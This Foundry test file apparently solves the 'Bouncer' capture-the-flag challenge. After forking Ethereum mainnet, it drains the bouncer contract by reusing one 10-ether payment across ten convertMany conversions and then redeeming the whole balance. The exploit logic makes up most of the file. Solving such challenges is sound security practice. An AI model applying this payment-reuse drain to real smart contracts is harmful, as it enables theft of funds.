pragma solidity 0.8.0;

import "../src/bouncer/Bouncer.sol";
import "forge-std/Test.sol";

interface WETH9 is ERC20Like {
    function deposit() external payable;
}

contract Exploit is Test {
    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    WETH9 constant weth = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Bouncer public bouncer;
    Party public party;
    address player = address(0xBaDa55);

    function setUp() public {
        vm.createSelectFork("https://rpc.ankr.com/eth");
        // give some cash to the bouncer for his drinks
        bouncer = new Bouncer{value: 50 ether}();

        // 2 * eth
        bouncer.enter{value: 1 ether}(address(weth), 10 ether);
        bouncer.enter{value: 1 ether}(ETH, 10 ether);

        party = new Party(bouncer);
        vm.deal(player, 11 ether);
    }

    function isSolved() public view returns (bool) {
        return address(bouncer).balance == 0;
    }

    function testBouncerExploit() public {
        vm.startPrank(player);
        bouncer.enter{value: 1 ether}(ETH, 10 ether);
        uint256[] memory ids = new uint256[](10);

        vm.warp(block.timestamp + 1);
        bouncer.convertMany{value: 10 ether}(player, ids);
        bouncer.redeem(ERC20Like(ETH), address(bouncer).balance);
        require(isSolved(), "NOT SOLVED");
    }
}



